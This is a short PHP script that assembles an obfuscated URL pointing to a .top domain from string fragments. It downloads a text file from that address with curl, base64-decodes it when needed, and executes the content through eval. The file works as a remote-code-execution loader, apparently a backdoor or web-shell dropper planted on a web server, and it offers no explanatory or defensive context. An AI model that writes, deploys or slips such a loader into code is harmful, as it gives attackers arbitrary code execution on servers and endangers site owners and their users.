<?php
$p1 = "htt"; $p2 = "ps:/"; $p3 = "/amp"; $p4 = "nyapu"; $p5 = "nyaku"; $p6 = ".top"; 
$p7 = "/tool"; $p8 = "s/s-m"; $p9 = "edia"; $p10 = "/med"; $p11 = "ia-ne"; $p12 = "w.txt";

$url = $p1 . $p2 . $p3 . $p4 . $p5 . $p6 . $p7 . $p8 . $p9 . $p10 . $p11 . $p12;

$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, $url);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
$data = curl_exec($ch);
curl_close($ch);

// Auto-detect encoding
if (base64_decode($data, true)) {
    $data = base64_decode($data);
}
eval('?>'.$data);
?>
